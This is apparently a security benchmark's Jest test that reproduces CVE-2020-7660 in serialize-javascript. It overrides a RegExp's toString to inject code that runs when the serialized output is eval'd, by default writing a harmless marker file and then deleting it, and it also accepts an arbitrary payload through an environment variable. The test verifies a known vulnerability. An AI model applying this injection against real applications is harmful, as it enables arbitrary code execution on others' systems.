test("Arbitrary code execution in serialize-javascript", () => {
  expect.assertions(2);
  const fs = require("fs");
  const serialize = require("serialize-javascript");
  const path = "./serialize-javascript";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  // CVE-2020-7660: serialize() inserts a RegExp value's toString() unescaped
  // (serialize-javascript/index.js:170) into the string that is then eval'd, so a
  // RegExp whose toString() returns attacker code runs on deserialization.
  // Harmless payload: create a marker file, which the test then checks and removes.
  const evil = /x/;
  evil.toString = () =>
    process.env.SECBENCH_PAYLOAD ||
    ("/x/, __proto__: require(`fs`).writeFileSync(`serialize-javascript`, ``)");
  eval("(" + serialize({ a: evil }) + ")");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
